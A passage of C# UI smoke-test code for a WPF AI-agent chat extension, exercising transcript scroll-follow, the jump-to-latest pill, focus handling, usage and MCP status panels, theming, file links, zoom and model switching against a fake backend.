                    await SettleAsync(scenarioWindow);

                    gotEmptyWheel = nothingToScroll && !scenarioView.ShowJumpToLatest;
                    emptyWheelDetail = $"nothingToScroll={nothingToScroll} "
                        + $"({scenarioScroller.ExtentHeight:F0}/{scenarioScroller.ViewportHeight:F0}), "
                        + $"pillOffered={scenarioView.ShowJumpToLatest}";

                    // (2) Leaving the Chat tab and coming back. Reported as the pill popping up on the
                    // way back because the view is "not quite on the bottom" — so what has to be
                    // reproduced is a SMALL move nobody asked for. Three mechanisms can produce one and
                    // there is no way to tell from here which one VS's tab switch uses, so all three are
                    // driven and the invariant asserted after each: hiding and re-showing the content,
                    // collapsing and restoring the viewport, and a bring-into-view. What makes them bite
                    // is the transcript below — 200 items means the panel is estimating, so coming back
                    // re-realises a viewport of them and the real bottom moves out from under an offset
                    // that never changed.
                    //
                    // Which of the three reproduced, measured against the unfixed build: only the
                    // bring-into-view, and it reproduced the report exactly (98px short of the bottom,
                    // pill offered, the next delta not followed). Hiding and re-showing changes nothing
                    // because WPF skips layout for a collapsed subtree entirely, and the viewport
                    // collapse was survived by the old clamp arithmetic. Both are kept anyway: they are
                    // a settle each, they go through a different code path (a viewport change rather
                    // than an offset change), and the viewport one DOES fail against the naive "any
                    // upward move is the user" rule that this all replaces.
                    for (var i = 0; i < 200; i++)
                        scenarioVm.Items.Add(new MessageItemViewModel(MessageRole.Assistant,
                            $"Transcript item {i}. Long enough to take a line or two of a narrow pane, "
                            + "so two hundred of them are worth many viewports."));
                    await SettleAsync(scenarioWindow);

                    var tabSteps = new List<string>();
                    // Count - 1 rather than [^1]: System.Index is net6+ and this host also builds net472.
                    var tabTail = (MessageItemViewModel)scenarioVm.Items[scenarioVm.Items.Count - 1];

                    async Task<bool> HeldTheBottomThroughAsync(string step, Func<Task> disturb)
                    {
                        scenarioScroller.ScrollToEnd();
                        await SettleAsync(scenarioWindow);
                        await disturb().ConfigureAwait(true);
                        await SettleAsync(scenarioWindow);

                        var atBottom = scenarioScroller.VerticalOffset >= scenarioScroller.ScrollableHeight - 24;
                        var pillHidden = !scenarioView.ShowJumpToLatest;
                        // Following is a claim about the NEXT delta, so prove it with one rather than
                        // trusting the flag: a view parked at the bottom that has silently stopped
                        // following looks identical until the agent speaks again.
                        tabTail.Append($"\n\nA delta after {step}.");
                        await SettleAsync(scenarioWindow);
                        var followedAfter = scenarioScroller.VerticalOffset >= scenarioScroller.ScrollableHeight - 24;

                        var ok = atBottom && pillHidden && followedAfter;
                        if (!ok)
                            tabSteps.Add($"{step}: atBottom={atBottom} pillHidden={pillHidden} "
                                + $"followedAfter={followedAfter} "
                                + $"@{scenarioScroller.VerticalOffset:F0}/{scenarioScroller.ScrollableHeight:F0}");
                        return ok;
                    }

                    gotTabSwitchFollow = await HeldTheBottomThroughAsync("hide/show", async () =>
                    {
                        scenarioView.Visibility = Visibility.Collapsed;
                        await SettleAsync(scenarioWindow);
                        scenarioView.Visibility = Visibility.Visible;
                    }).ConfigureAwait(true);

                    gotTabSwitchFollow &= await HeldTheBottomThroughAsync("viewport collapse", async () =>
                    {
                        var height = scenarioWindow.Height;
                        scenarioWindow.Height = 120;
                        await SettleAsync(scenarioWindow);
                        scenarioWindow.Height = height;
                    }).ConfigureAwait(true);

                    gotTabSwitchFollow &= await HeldTheBottomThroughAsync("bring-into-view", () =>
                    {
                        // A focus change is not a scroll gesture, but WPF answers one by raising
                        // RequestBringIntoView for the newly focused element, and the ScrollViewer obeys
                        // it — so a tab switch restoring focus to a row that is only PARTLY in view
                        // moves the transcript with nobody having touched the wheel. That is the reported
                        // shape exactly: back from the tab and "not quite on the bottom".
                        //
                        // The topmost realised row is the one to use: it is the one straddling the top
                        // edge, so bringing it in is a small upward move rather than a jump. Deliberately
                        // NOT through ChatView.BringItemIntoView — that is the plan strip's explicit
                        // "take me there", a different act with different rights. This is WPF's own.
                        var top = scenarioItems is System.Windows.Controls.ItemsControl items
                            ? items.ItemContainerGenerator.ContainerFromIndex(
                                scenarioView.FirstRealizedIndexForDiagnostics()) as FrameworkElement
                            : null;
                        top?.BringIntoView();
                        return Task.CompletedTask;
                    }).ConfigureAwait(true);

                    tabSwitchDetail = tabSteps.Count == 0
                        ? $"held @{scenarioScroller.VerticalOffset:F0}/{scenarioScroller.ScrollableHeight:F0}"
                        : string.Join("; ", tabSteps);
                }

                scenarioWindow.Close();

                // Issue #195: the transcript SHRINKING back to fitting must take the pill with it. The
                // reported sequence is one gesture each way — expand a row until the conversation
                // overflows, scroll up to read it (the pill is correctly offered), then collapse the row
                // again — and at the end the scrollbar is gone while the pill is still there, offering a
                // jump to a bottom the view is already showing.
                //
                // The same fact as the empty-wheel case above, arriving by the other route. There the
                // wheel declines to clear the follow because a transcript that fits moves nothing; here
                // the follow was cleared while there WAS something to scroll, and the content then shrank
                // out from under it. Nothing in a scroll change's direction can see that, which is why it
                // is asked of the scrollable height instead.
                var gotCollapseRepin = false;
                var collapseRepinDetail = "skipped";
                var collapseVm = new ChatViewModel(_engine!,
                    new StartSessionRequest("fake", null, workDir, modeName, null), sessionStore: store);
                var collapseTail = new MessageItemViewModel(MessageRole.Assistant, "A short conversation that fits.");
                collapseVm.Items.Add(collapseTail);
                var collapseRow = new ToolItemViewModel("collapse-1", "Read big-file.txt", "read")
                {
                    // Long enough that one row's detail overflows the pane several times over.
                    OutputDetail = string.Join("\n",
                        Enumerable.Range(0, 80).Select(i => $"line {i}: expanded detail, a line at a time.")),
                };
                collapseVm.Items.Add(collapseRow);
                var collapseWindow = new MainWindow
                {
                    DataContext = collapseVm,
                    Width = 500,
                    Height = 400,
                    ShowInTaskbar = false,
                    Left = -20000,
                    Top = -20000,
                };
                collapseWindow.Show();
                await SettleAsync(collapseWindow);
                if (FindDescendantByName(collapseWindow, "TranscriptItems") is UIElement collapseItems
                    && collapseWindow.Content is CodeWicket.UI.Views.ChatView collapseView
                    && FindDescendantOfType<System.Windows.Controls.ScrollViewer>(collapseItems, _ => true)
                        is { } collapseScroller)
                {
                    void CollapseWheelUp()
                    {
                        collapseItems.RaiseEvent(new System.Windows.Input.MouseWheelEventArgs(
                            System.Windows.Input.Mouse.PrimaryDevice, Environment.TickCount, 120)
                        {
                            RoutedEvent = UIElement.PreviewMouseWheelEvent,
                        });
                        collapseScroller.RaiseEvent(new System.Windows.Input.MouseWheelEventArgs(
                            System.Windows.Input.Mouse.PrimaryDevice, Environment.TickCount, 120)
                        {
                            RoutedEvent = UIElement.MouseWheelEvent,
                        });
                    }

                    // The starting state IS the precondition: a conversation that fits, with no pill. A
                    // transcript that had somehow overflowed would make the rest of this pass by never
                    // being the case the report is about.
                    var fittedFirst = collapseScroller.ScrollableHeight <= 0 && !collapseView.ShowJumpToLatest;

                    // Expanding is a click on the row header, and what that handler does to the row is
                    // exactly this line. The click's own gesture bookkeeping is deliberately not driven:
                    // the pointer is up again by the time the toggle runs, so an expansion is not a scroll
                    // gesture — which is the reason the follow survives it.
                    collapseRow.IsExpanded = true;
                    await SettleAsync(collapseWindow);
                    var overflowed = collapseScroller.ScrollableHeight > 4;
                    var pillAfterExpand = collapseView.ShowJumpToLatest;

                    // Reading the row that was just opened is what stops the follow, and it has to be a
                    // real gesture: the pill must actually be offered here or the collapse below has
                    // nothing to withdraw.
                    CollapseWheelUp();
                    CollapseWheelUp();
                    await SettleAsync(collapseWindow);
                    var pillAfterScroll = collapseView.ShowJumpToLatest;

                    collapseRow.IsExpanded = false;
                    await SettleAsync(collapseWindow);
                    var fitsAgain = collapseScroller.ScrollableHeight <= 4;
                    var pillGone = !collapseView.ShowJumpToLatest;

                    // The pill going is the symptom; the follow coming back is the fact underneath it, and
                    // only a delta can prove that one — a view sitting on a transcript it fits looks
                    // identical whether or not it will ride the next message.
                    //
                    // The delta has to be WAITED for and its growth asserted, not assumed: a markdown
                    // message rebuilds on a throttle, so a settle or two after the append the transcript
                    // is still the size it was - and on a transcript that has not grown, "at the bottom"
                    // is 0 >= 0, which the unfixed build satisfies as happily as the fixed one. Measured:
                    // this read followedAfter=True @0/0 before the wait was added.
                    collapseTail.Append("\n\n" + string.Join("\n",
                        Enumerable.Range(0, 60).Select(i => $"A line of the next reply ({i}).")));
                    var grewAgain = await WaitForTranscriptAsync(
                        () => collapseScroller.ScrollableHeight > 4, TimeSpan.FromSeconds(3)).ConfigureAwait(true);
                    await SettleAsync(collapseWindow);
                    var followedAfter = grewAgain
                        && collapseScroller.VerticalOffset >= collapseScroller.ScrollableHeight - 24;

                    gotCollapseRepin = fittedFirst && overflowed && pillAfterScroll && fitsAgain
                        && pillGone && followedAfter;
                    collapseRepinDetail = $"fittedFirst={fittedFirst}, overflowed={overflowed}, "
                        + $"pillAfterExpand={pillAfterExpand}, pillAfterScroll={pillAfterScroll}, "
                        + $"fitsAgain={fitsAgain}, pillGone={pillGone}, "
                        + $"followedAfter={followedAfter} (grew={grewAgain}) "
                        + $"@{collapseScroller.VerticalOffset:F0}/{collapseScroller.ScrollableHeight:F0}";
                }

                collapseWindow.Close();

                // Issue #90 follow-up: the chat hosted the way VS hosts it. A tool window's WPF content
                // lives in an HwndSource whose RootVisual is the CONTENT — there is no Window in the
                // tree at all — and that is the difference a focus fix has to survive:
                // when a focused control hides, WPF re-homes the focus onto the presentation source's
                // root visual, which is a Window in this host and is not one in devenv. A check that
                // only runs against a Window-hosted view cannot see it.
                var gotHostedFocus = false;
                var hostedDetail = "skipped";
                var hostedVm = new ChatViewModel(_engine!,
                    new StartSessionRequest("fake", null, workDir, modeName, null), sessionStore: store);
                var hostedView = new CodeWicket.UI.Views.ChatView { DataContext = hostedVm };
                var hostedParams = new System.Windows.Interop.HwndSourceParameters("cwkt-hosted-probe")
                {
                    WindowStyle = unchecked((int)0x90000000), // WS_POPUP | WS_VISIBLE
                    PositionX = -20000,
                    PositionY = -20000,
                    Width = 520,
                    Height = 420,
                };
                var hostedSource = new System.Windows.Interop.HwndSource(hostedParams) { RootVisual = hostedView };
                try
                {
                    hostedView.UpdateLayout();
                    await System.Windows.Threading.Dispatcher.Yield(System.Windows.Threading.DispatcherPriority.Background);
                    hostedView.UpdateLayout();

                    var rootIsNotAWindow = hostedSource.RootVisual is not Window;

                    // Enough transcript to scroll, then away from the bottom so the pill is offered.
                    var hostedTail = new MessageItemViewModel(MessageRole.Assistant, "Hosted probe.");
                    hostedVm.Items.Add(hostedTail);
                    for (var i = 0; i < 40; i++)
                        hostedTail.Append($"\n\nHosted paragraph {i}, long enough to overflow the viewport.");
                    hostedView.UpdateLayout();
                    await System.Windows.Threading.Dispatcher.Yield(System.Windows.Threading.DispatcherPriority.Background);
                    hostedView.UpdateLayout();

                    // Scrolled away by the GESTURE, since that is the only thing that stops the follow
                    // now — a bare ScrollToVerticalOffset leaves it pinned and the pill never appears.
                    var hostedScroller = hostedView.TranscriptScrollForDiagnostics;
                    var hostedItems = FindDescendantByName(hostedView, "TranscriptItems") as UIElement;
                    for (var i = 0; i < 6 && hostedItems is not null && hostedScroller is not null; i++)
                    {
                        hostedItems.RaiseEvent(new System.Windows.Input.MouseWheelEventArgs(
                            System.Windows.Input.Mouse.PrimaryDevice, Environment.TickCount, 120)
                        {
                            RoutedEvent = UIElement.PreviewMouseWheelEvent,
                        });
                        hostedScroller.RaiseEvent(new System.Windows.Input.MouseWheelEventArgs(
                            System.Windows.Input.Mouse.PrimaryDevice, Environment.TickCount, 120)
                        {
                            RoutedEvent = UIElement.MouseWheelEvent,
                        });
                        hostedView.UpdateLayout();
                        await System.Windows.Threading.Dispatcher.Yield(System.Windows.Threading.DispatcherPriority.Background);
                        hostedView.UpdateLayout();
                    }

                    var pill = FindDescendantByName(hostedView, "JumpToLatestButton") as System.Windows.Controls.Button;
                    var hostedInput = FindDescendantByName(hostedView, "InputBox") as System.Windows.Controls.TextBox;
                    var pillOffered = pill?.Visibility == Visibility.Visible;

                    // A real click focuses the button; that is the focus with nowhere to go once the
                    // button hides itself.
                    var pillFocused = pill?.Focus() == true;

                    // Sampled at the instant the pill is withdrawn, which is what separates the two
                    // mechanisms: the click HANDS the focus on before hiding (so it reads as the input
                    // box here), while the reclaim only recognises an abandoned focus afterwards (so it
                    // would read as the button, and be corrected a dispatcher turn later). Without this
                    // the hand-off is invisible — the end state is identical either way.
                    FrameworkElement? focusAtWithdrawal = null;
                    var showJump = System.ComponentModel.DependencyPropertyDescriptor.FromProperty(
                        CodeWicket.UI.Views.ChatView.ShowJumpToLatestProperty,
                        typeof(CodeWicket.UI.Views.ChatView));
                    EventHandler onShowJumpChanged = (_, _) =>
                    {
                        if (!hostedView.ShowJumpToLatest && focusAtWithdrawal is null)
                            focusAtWithdrawal = System.Windows.Input.Keyboard.FocusedElement as FrameworkElement;
                    };
                    showJump.AddValueChanged(hostedView, onShowJumpChanged);

                    pill?.RaiseEvent(new RoutedEventArgs(
                        System.Windows.Controls.Primitives.ButtonBase.ClickEvent));
                    showJump.RemoveValueChanged(hostedView, onShowJumpChanged);
                    hostedView.UpdateLayout();
                    await System.Windows.Threading.Dispatcher.Yield(System.Windows.Threading.DispatcherPriority.Background);
                    hostedView.UpdateLayout();

                    var landed = System.Windows.Input.Keyboard.FocusedElement as FrameworkElement;
                    var landedName = landed is null
                        ? "<null>"
                        : (string.IsNullOrEmpty(landed.Name) ? landed.GetType().Name : landed.Name);

                    // The permission banner in the same hosting. It matters more than the pill here:
                    // the pill hands its focus on before hiding and so needs no theory about the host,
                    // whereas the banner can also be cleared with no click at all (the turn ending, a
                    // session switch) and is therefore the path that rests entirely on recognising an
                    // abandoned focus — the thing this hosting gets different.
                    _ = hostedVm.RequestPermissionAsync(new PermissionRequestDto(
                        "hosted-banner", "Write notes.txt", "edit", null, null,
                        new[] { new PermissionOptionDto("allow_once", "Allow", "AllowOnce") }));
                    var hostedBanner = hostedVm.PendingPermission;
                    hostedView.UpdateLayout();
                    await System.Windows.Threading.Dispatcher.Yield(System.Windows.Threading.DispatcherPriority.Background);
                    hostedView.UpdateLayout();

                    var hostedAllow = FindDescendantOfType<System.Windows.Controls.Button>(
                        hostedView, b => (b.Content as string) == "Allow");
                    var hostedAllowFocused = hostedAllow?.Focus() == true;
                    hostedBanner?.Options.FirstOrDefault()?.Command.Execute(null);
                    hostedView.UpdateLayout();
                    await System.Windows.Threading.Dispatcher.Yield(System.Windows.Threading.DispatcherPriority.Background);
                    hostedView.UpdateLayout();

                    var bannerLanded = System.Windows.Input.Keyboard.FocusedElement as FrameworkElement;
                    var bannerLandedName = bannerLanded is null
                        ? "<null>"
                        : (string.IsNullOrEmpty(bannerLanded.Name) ? bannerLanded.GetType().Name : bannerLanded.Name);

                    gotHostedFocus = rootIsNotAWindow && pillOffered && pillFocused
                        && ReferenceEquals(focusAtWithdrawal, hostedInput)
                        && ReferenceEquals(landed, hostedInput)
                        && hostedAllowFocused && ReferenceEquals(bannerLanded, hostedInput);
                    hostedDetail = $"rootIsNotAWindow={rootIsNotAWindow} "
                        + $"(root={hostedSource.RootVisual?.GetType().Name}), offered={pillOffered}, "
                        + $"focused={pillFocused}, atWithdrawal={focusAtWithdrawal?.Name ?? "<null>"}, "
                        + $"landed={landedName}, "
                        + $"bannerFocused={hostedAllowFocused}, bannerLanded={bannerLandedName}, "
                        + $"foreground={ForegroundStamp()}";
                }
                finally
                {
                    hostedSource.Dispose();
                }

                // Usage proof: the fake reports consumption in the two halves the real backends split it
                // across — a mid-turn snapshot (context fill + cost) and the per-turn token split on
                // completion. Both must be present at once, which is the MERGE working: a host that
                // replaced wholesale would have lost the context figure when the turn ended.
                // ContextPercent + Cost come from the mid-turn snapshot, TotalTokens from the turn's
                // completion — all three present at once IS the merge. (What those figures render as is
                // the panel's business, asserted below; this check is about the two halves surviving.)
                var gotUsage = vm.HasUsage
                    && vm.Usage is { ContextPercent: 21.4, TotalTokens: 32351, Cost: > 0.41 }
                    && vm.ContextLabel == "21%"
                    && vm.UsageLevel == UsageLevel.Normal;

                // Usage-panel proof: the rows the popup renders. Asserted on composition rather than
                // pixels — the ordering (context, thresholds, cost, turn, breakdown) and the sub-item
                // flag that indents cache/breakdown detail under the row it belongs to. The fake reports
                // both backends' fields at once, so this covers the union; a real backend shows fewer.
                var usageRows = vm.UsageRows;
                var gotUsagePanel = usageRows.Count >= 6
                    && usageRows[0].Label == "Context window" && usageRows[0].Value == "21.4K / 100K tokens"
                    && usageRows.Any(r => r.Label == "Auto-summarizes at" && r.Value == "80%")
                    && usageRows.Any(r => r.Label == "Truncates at" && r.Value == "95%")
                    && usageRows.Any(r => r.Label == "Session cost (API rates)" && r.Value.StartsWith("$", StringComparison.Ordinal))
                    && usageRows.Any(r => r.Label == "Last turn" && r.Value == "32.4K tokens")
                    && usageRows.Any(r => r is { Label: "Cached", IsSubItem: true })
                    && usageRows.Any(r => r is { Label: "Your prompts", IsSubItem: true, Value: "4.4K  ·  4.4%" })
                    // "allowed" is the uninteresting default and must not take a row — a panel that
                    // always reports a rate limit trains people to ignore the one that matters. Matched
                    // on the whole row set rather than one label, since the label names the limit window.
                    && !usageRows.Any(r => r.Label.EndsWith("limit", StringComparison.OrdinalIgnoreCase));
                // Flattened for the one-line result file (the tooltip itself is multi-line).
                var usageDetailOneLine = vm.UsageDetail.Replace("\n", " | ");

                // MCP roster panel (issue #122). Reaches what no unit test does: both events crossing
                // the real engine→shell RPC hop and landing through ApplyLive, so the working-window
                // exclusion, the never-record rule and the Apply cases are all exercised at once.
                //
                // The fake sends TWO roster snapshots — mid-connect, then everything up — because the
                // interesting assertion is the transition. One frame cannot distinguish a panel that
                // updates from one that latched on its first value, and latching is the failure mode
                // this panel is most exposed to (it is fed entirely by repeated snapshots).
                var mcpRows = vm.McpRows;
                // Resolved by NAME rather than by index: the sections gained headings, and an index
                // that silently shifts is how a content assertion starts describing the wrong row.
                var ourRow = mcpRows.SingleOrDefault(r => r.Label == CodeWicket.Core.Ide.IdeMcpServer.Name);
                var gotMcpPanel = vm.CanShowMcpStatus
                    // Our bridge is its own section and comes first: it is ours, not the user's config.
                    && mcpRows.Count >= 2
                    && mcpRows[0] is { IsHeading: true, Label: "This extension" }
                    // Our bridge is named like any other SERVER, by the name it publishes, and reports
                    // what WE counted — including a call count a backend could never tell us.
                    && ourRow is not null
                    && ourRow.Value == "connected · 2 tools · 1 call"
                    // Second snapshot applied, so the count moved and the pending badge cleared.
                    && mcpRows.Any(r => r is { Label: "Agent MCP servers", Value: "2 of 2 connected" })
                    && vm.McpPendingLabel.Length == 0
                    && !vm.McpIsPending
                    && mcpRows.Any(r => r is { Label: "slow-mcp", Depth: 0 } && r.Value.Contains("oauth", StringComparison.Ordinal))
                    // The agent's servers sit at OUR level, because they are the same kind of thing.
                    // Drawn as children of the group row they made our single bridge look like the
                    // parent of every server the user has, which is what the headings are for instead.
                    && mcpRows.Single(r => r.Label == "fake-mcp").Depth == ourRow.Depth
                    && mcpRows.Any(r => r is { Label: "Agent MCP servers", IsHeading: true })
                    // Negatively, the two lies this panel exists not to tell: a server we have never
                    // seen fail described as failed, and a count where none is knowable.
                    && !mcpRows.Any(r => r.Value.Contains("fail", StringComparison.OrdinalIgnoreCase))
                    && !mcpRows.Any(r => r.Value.Contains("not reported", StringComparison.Ordinal));

                // Probe-is-not-blind guard: with the events unwired, every assertion above about the
                // roster's CONTENT would be vacuously reported as a clean "nothing pending" pass. So
                // establish separately that a roster actually arrived before believing any of it.
                var mcpRosterArrived = mcpRows.Any(r => r.Label == "Agent MCP servers")
                    && !mcpRows.Any(r => r is { Label: "Agent MCP servers", Value: "not reported by this backend" });
                gotMcpPanel = gotMcpPanel && mcpRosterArrived;

                // The panel is a Popup, so it renders in its own hwnd and nothing above proves a single
                // element was realised. Open it and count the chrome WPF actually built — the #118
                // lesson: a check that cannot drive WPF's own decision must assert the mechanism.
                vm.IsMcpOpen = true;
                await Task.Yield();
                window.UpdateLayout();
                await window.Dispatcher.InvokeAsync(() => { }, System.Windows.Threading.DispatcherPriority.Background);
                var mcpPopup = FindDescendantByName(window, "McpPopup") as System.Windows.Controls.Primitives.Popup;
                var mcpRealisedRows = mcpPopup?.Child is null
                    ? 0
                    : CountDescendants<System.Windows.Controls.TextBlock>(
                        mcpPopup.Child, t => !string.IsNullOrEmpty(t.Text));
                var mcpButtonPresent = FindDescendantByName(window, "McpButton") is not null;
                gotMcpPanel = gotMcpPanel && mcpButtonPresent && mcpRealisedRows >= mcpRows.Count;
                vm.IsMcpOpen = false;
                await window.Dispatcher.InvokeAsync(() => { }, System.Windows.Threading.DispatcherPriority.Background);

                var mcpDetailOneLine = vm.McpDetail.Replace("\n", " | ");

                // Typeface-inheritance proof: the assistant's markdown document must pick up the pane's
                // font family rather than pinning its own. Asserted against a distinctive family set on
                // the ChatView root, which is where a host lands its typeface (the VSIX points that at
                // VS's environment font). Pinned here because the failure is silent and only visible to
                // someone who has changed their IDE font: assistant text in one typeface, the user's own
                // bubbles and the input box in another.
                // The transcript is virtualised, so an assistant message that has scrolled out of view
                // has no visual at all to probe. Realise it first — otherwise this check silently
                // degrades into "no document found", which reads identically to a broken binding.
                var assistantItem = vm.Items.OfType<MessageItemViewModel>()
                    .LastOrDefault(m => m.IsAssistant && !string.IsNullOrEmpty(m.Text));
                var assistantContainer = assistantItem is not null && window.Content is CodeWicket.UI.Views.ChatView view
                    ? view.BringItemIntoView(assistantItem)
                    : null;
                var assistantDoc = assistantContainer is not null
                    ? FindDescendantOfType<System.Windows.Controls.FlowDocumentScrollViewer>(assistantContainer, v => v.Document is not null)
                    : null;
                var chatRoot = window.Content as System.Windows.Controls.UserControl;
                var probeFamily = new System.Windows.Media.FontFamily("Courier New");
                var priorFamily = chatRoot?.FontFamily;
                if (chatRoot is not null)
                    chatRoot.FontFamily = probeFamily;
                window.UpdateLayout();
                var gotFontInheritance = assistantDoc?.Document is { } liveDoc
                    && liveDoc.FontFamily?.Source == "Courier New";
                if (chatRoot is not null && priorFamily is not null)
                    chatRoot.FontFamily = priorFamily; // leave the pane as we found it for later captures

                // Themed values are RESOLVED, not referenced (issue #86). This is a mechanism check and
                // the unit tests cannot stand in for it: they pin that the renderer USES a palette it is
                // handed, but the palette is resolved in MarkdownText.Render from the live viewer, and
                // nulling that one line leaves every offline test green while the fix does nothing and
                // the drag is slow again.
                //
                // A value and a resolved reference are indistinguishable by the value itself — both end
                // up as the right brush on an attached element. IsExpression is what separates them: a
                // SetResourceReference installs a ResourceReferenceExpression, a plain assignment does
                // not. So this asserts the EXPENSIVE path is gone, not that the colours are right.
                // A REFERENCE IS NOT AUTOMATICALLY A DEFECT, and reading once could not tell the
                // difference. A render that happens while the viewer is out of the tree falls back to
                // references BY DESIGN — MarkdownPalette.Resolve returns null there, and the renderer
                // owes a corrective render on reattach (MarkdownText.EnsureRerenderOnReattach). So a
                // single reading catches the permanent case and the momentary one identically, and
                // reports both as "the expensive path is back".
                //
                // That cost an hour: churning the transcript earlier in this method left the viewer
                // mid-cycle and this check failed 4-5 runs in 6 with nothing wrong with the product,
                // pointing at a palette that was working perfectly. Reading TWICE separates them, and it
                // does not weaken the check — with the palette genuinely gone the second reading is an
                // expression too (injected and watched to fail).
                static (bool IsExpression, string Text, string? Family, object Base)? ReadCodeRun(
                    System.Windows.Controls.FlowDocumentScrollViewer? viewer)
                {
                    if (viewer?.Document is not { } doc)
                        return null;
                    var run = doc.Blocks.OfType<System.Windows.Documents.Paragraph>()
                        .SelectMany(p => p.Inlines)
                        .OfType<System.Windows.Documents.Run>()
                        .FirstOrDefault(r => r.Background is not null);
                    if (run is null)
                        return null;
                    var src = System.Windows.DependencyPropertyHelper.GetValueSource(
                        run, System.Windows.Documents.TextElement.FontFamilyProperty);
                    return (src.IsExpression, run.Text, run.FontFamily?.Source, src.BaseValueSource);
                }

                var gotResolvedTheme = false;
                var resolvedThemeDetail = "no inline code run found";
                if (ReadCodeRun(assistantDoc) is { } firstRead)
                {
                    gotResolvedTheme = !firstRead.IsExpression;
                    resolvedThemeDetail =
                        $"text={firstRead.Text}, isExpression={firstRead.IsExpression}, "
                        + $"family={firstRead.Family}, base={firstRead.Base}";

                    if (firstRead.IsExpression)
                    {
                        // Let the corrective render land, then re-find the run: the correction assigns a
                        // FRESH FlowDocument, so the run read above belongs to a document that is no
                        // longer the viewer's and would report the old answer forever.
                        await SettleAsync(window).ConfigureAwait(true);
                        var second = ReadCodeRun(assistantDoc);
                        gotResolvedTheme = second is { IsExpression: false };
                        resolvedThemeDetail = second is null
                            ? resolvedThemeDetail + " -> re-read found no run"
                            : $"text={second.Value.Text}, isExpression=True->{second.Value.IsExpression}"
                              + (second.Value.IsExpression
                                  ? " (STUCK on references — the expensive path is live)"
                                  : " (transient: rendered detached, corrected on reattach)")
                              + $", family={second.Value.Family}, base={second.Value.Base}";
                    }
                }

                // File-reference proof: "Data/SmokeLink.cs:12" written in the agent's prose becomes a
                // hyperlink that opens the file, while a name that isn't on disk stays plain text. The
                // POLL is the point — the renderer never touches the disk, so the reference is plain
                // text on its first render and only becomes a link once the off-thread resolution lands
                // and the document is rebuilt. That upgrade is the part that can silently not happen.
                var linkTarget = Path.Combine(workDir, "Data", "SmokeLink.cs");
                Directory.CreateDirectory(Path.GetDirectoryName(linkTarget)!);
                File.WriteAllText(linkTarget, "// smoke");
                var priorFileOpened = _lastFileOpened;
                // The reference sits in a BULLET on purpose: a list is the commonest shape agent prose
                // puts one in, and it is the shape Hyperlinks() could not walk into — with the descent
                // removed this check reads zero links and reports the upgrade as never having happened,
                // which is what it did silently until #247.
                var linkMessage = new MessageItemViewModel(MessageRole.Assistant,
                    "Fixed:\n\n- `Data/SmokeLink.cs:12`\n- SmokeMissing.cs is generated, so it stays plain.");
                vm.Items.Add(linkMessage);
                var linkViewer = window.Content is CodeWicket.UI.Views.ChatView linkView
                    ? FindDescendantOfType<System.Windows.Controls.FlowDocumentScrollViewer>(
                        linkView.BringItemIntoView(linkMessage)!, v => v.Document is not null)
                    : null;
                await WaitForTranscriptAsync(
                    () => linkViewer?.Document is { } d && Hyperlinks(d).Count > 0,
                    TimeSpan.FromSeconds(5)).ConfigureAwait(true);
                var fileLinks = linkViewer?.Document is { } linkDoc ? Hyperlinks(linkDoc) : new List<System.Windows.Documents.Hyperlink>();
                var linkText = fileLinks.Count == 1 ? LinkText(fileLinks[0]) : null;
                if (fileLinks.Count == 1)
                    fileLinks[0].RaiseEvent(new RoutedEventArgs(System.Windows.Documents.Hyperlink.ClickEvent));
                var gotFileLink = fileLinks.Count == 1
                    && linkText == "Data/SmokeLink.cs:12"
                    && _lastFileOpened == (linkTarget, 12);
                var fileLinkDetail = $"links={fileLinks.Count}, text={linkText}, opened={_lastFileOpened}";
                vm.Items.Remove(linkMessage);
                _lastFileOpened = priorFileOpened; // leave the test-jump check's evidence intact

                // Zoom-readout proof: the pill is invisible and click-through at rest (it overlays the
                // transcript, so a stray hit-test would swallow scrolling), and a zoom change flashes the
                // NEW percentage. 100 → 110 also proves it reads the post-change scale, not the old one.
                var zoomPill = FindDescendantByName(window, "ZoomFlash");
                var zoomText = FindDescendantByName(window, "ZoomFlashText") as System.Windows.Controls.TextBlock;
                var pillHiddenAtRest = zoomPill is { Opacity: 0, IsHitTestVisible: false };
                var chatView = window.Content as CodeWicket.UI.Views.ChatView;
                // Reset first: ChatView restores the persisted zoom from the REAL config.json, so the
                // starting scale is whatever this machine last used and "one step up" isn't a fixed value.
                chatView?.ApplyZoomShortcut(CodeWicket.UI.Views.ChatView.ZoomShortcut.Reset);
                chatView?.ApplyZoomShortcut(CodeWicket.UI.Views.ChatView.ZoomShortcut.In);
                // The fade-in is animated, so poll rather than assume a single yield lands after it.
                await WaitForTranscriptAsync(() => zoomPill?.Opacity > 0, TimeSpan.FromSeconds(2)).ConfigureAwait(true);
                var gotZoomFlash = pillHiddenAtRest && zoomText?.Text == "110%" && zoomPill?.Opacity > 0;
                var zoomFlashText = zoomText?.Text;
                chatView?.ApplyZoomShortcut(CodeWicket.UI.Views.ChatView.ZoomShortcut.Reset);

                // MCP-readiness proof (issue #19): the fake announces its "fake-mcp" server at session
                // start through the out-of-turn sink (no prompt is streaming at that moment) — the
                // notice must reach the transcript via shell/onAgentEvent.
                bool McpNotice(ChatViewModel model) => model.Items.OfType<NoticeItemViewModel>()
                    .Any(n => n.Text.Contains("MCP server 'fake-mcp' connected", StringComparison.Ordinal));
                var gotMcpNotice = McpNotice(vm);

                static List<NoticeItemViewModel> WarmFailureNotices(ChatViewModel model) =>
                    model.Items.OfType<NoticeItemViewModel>()
                        .Where(n => n.Text.Contains("couldn't start:", StringComparison.Ordinal))
                        .ToList();

                // Live model-switch proof: with a session running (fake advertises ModelSelection), pick a
                // different model. This must apply in place (session/set_model) — posting a "Model switched"
                // notice — rather than dropping the session ("your next message starts a new session").
                var otherModel = vm.Models.FirstOrDefault(m => m.Id != vm.SelectedModel?.Id);
                vm.SelectedModel = otherModel;
                // The switch round-trips through the engine (fire-and-forget); poll for its notice.
                bool SwitchedNotice() => vm.Items.OfType<NoticeItemViewModel>()
                    .Any(n => n.Text.Contains("Model switched to", StringComparison.Ordinal));
                for (var i = 0; i < 60 && !SwitchedNotice(); i++)
                    await Task.Delay(50).ConfigureAwait(true);
                var gotLiveSwitch = SwitchedNotice()
                    && !vm.Items.OfType<NoticeItemViewModel>()
                        .Any(n => n.Text.Contains("starts a new session", StringComparison.Ordinal));

                // Re-attach proof (issue #256): reopening the conversation whose backend session is
                // STILL LIVE must not resume it — the backend never dropped it, so the reopened pane
                // re-adopts the session and the next prompt is an ordinary send. The fake echoes
                // "[resumed <id>]" whenever a resume is issued, so the check is that absence over a
                // reply that DID arrive; the absence alone would be satisfied by a send that failed.
                vm.RestoreMostRecentSession();
